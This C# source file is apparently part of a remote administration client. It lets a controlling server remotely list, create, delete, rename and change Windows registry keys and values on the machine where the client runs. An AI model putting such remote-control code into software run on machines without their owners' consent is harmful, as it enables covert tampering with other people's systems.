using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xLightClient.Core.Networking;
using xLightClient.Core.Registry;
using xLightClient.Core.Extensions;
using Microsoft.Win32;
using System.Threading;
using xLightClient.Core.Helper;

namespace xLightClient.Core.Commands
{
    /*
     * Derived and Adapted By Justin Yanke
     * github: https://github.com/yankejustin
     * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     * This code is created by Justin Yanke and has only been
     * modified partially.
     * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     * Modified by StingRaptor on January 21, 2016
     * Modified by StingRaptor on March 15, 2016
     * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     */

    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE REGISTRY. */
    public static partial class CommandHandler
    {

        public static void HandleGetRegistryKey(xLightClient.Core.Packets.ServerPackets.DoLoadRegistryKey packet, Client client)
        {
            xLightClient.Core.Packets.ClientPackets.GetRegistryKeysResponse responsePacket = new Packets.ClientPackets.GetRegistryKeysResponse();
            try
            {
                RegistrySeeker seeker = new RegistrySeeker();
                seeker.BeginSeeking(packet.RootKeyName);

                responsePacket.Matches = seeker.Matches;
                responsePacket.IsError = false;
            }
            catch (Exception e)
            {
                responsePacket.IsError = true;
                responsePacket.ErrorMsg = e.Message;
            }
            responsePacket.RootKey = packet.RootKeyName;
            responsePacket.Execute(client);
        }

        #region Registry Key Edit

        public static void HandleCreateRegistryKey(xLightClient.Core.Packets.ServerPackets.DoCreateRegistryKey packet, Client client)
        {
            xLightClient.Core.Packets.ClientPackets.GetCreateRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetCreateRegistryKeyResponse();
            string errorMsg = "";
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryKey(packet.ParentPath, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;

            responsePacket.Match = new RegSeekerMatch(newKeyName, RegistryKeyHelper.GetDefaultValues(), 0);
            responsePacket.ParentPath = packet.ParentPath;

            responsePacket.Execute(client);
        }

        public static void HandleDeleteRegistryKey(xLightClient.Core.Packets.ServerPackets.DoDeleteRegistryKey packet, Client client)
        {
            xLightClient.Core.Packets.ClientPackets.GetDeleteRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetDeleteRegistryKeyResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.KeyName = packet.KeyName;

            responsePacket.Execute(client);
        }

        public static void HandleRenameRegistryKey(xLightClient.Core.Packets.ServerPackets.DoRenameRegistryKey packet, Client client)
        {
            xLightClient.Core.Packets.ClientPackets.GetRenameRegistryKeyResponse responsePacket = new Packets.ClientPackets.GetRenameRegistryKeyResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.OldKeyName = packet.OldKeyName;
            responsePacket.NewKeyName = packet.NewKeyName;

            responsePacket.Execute(client);
        }

        #endregion

        #region RegistryValue Edit

        public static void HandleCreateRegistryValue(xLightClient.Core.Packets.ServerPackets.DoCreateRegistryValue packet, Client client)
        {
            xLightClient.Core.Packets.ClientPackets.GetCreateRegistryValueResponse responsePacket = new Packets.ClientPackets.GetCreateRegistryValueResponse();
            string errorMsg = "";
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Value = new RegValueData(newKeyName, packet.Kind, packet.Kind.GetDefault());
            responsePacket.KeyPath = packet.KeyPath;

            responsePacket.Execute(client);
        }

        public static void HandleDeleteRegistryValue(xLightClient.Core.Packets.ServerPackets.DoDeleteRegistryValue packet, Client client)
        {
            xLightClient.Core.Packets.ClientPackets.GetDeleteRegistryValueResponse responsePacket = new Packets.ClientPackets.GetDeleteRegistryValueResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ValueName = packet.ValueName;
            responsePacket.KeyPath = packet.KeyPath;

            responsePacket.Execute(client);
        }

        public static void HandleRenameRegistryValue(xLightClient.Core.Packets.ServerPackets.DoRenameRegistryValue packet, Client client)
        {
            xLightClient.Core.Packets.ClientPackets.GetRenameRegistryValueResponse responsePacket = new Packets.ClientPackets.GetRenameRegistryValueResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.OldValueName = packet.OldValueName;
            responsePacket.NewValueName = packet.NewValueName;

            responsePacket.Execute(client);
        }

        public static void HandleChangeRegistryValue(xLightClient.Core.Packets.ServerPackets.DoChangeRegistryValue packet, Client client)
        {
            xLightClient.Core.Packets.ClientPackets.GetChangeRegistryValueResponse responsePacket = new Packets.ClientPackets.GetChangeRegistryValueResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.Value = packet.Value;

            responsePacket.Execute(client);
        }

        #endregion
    }
}
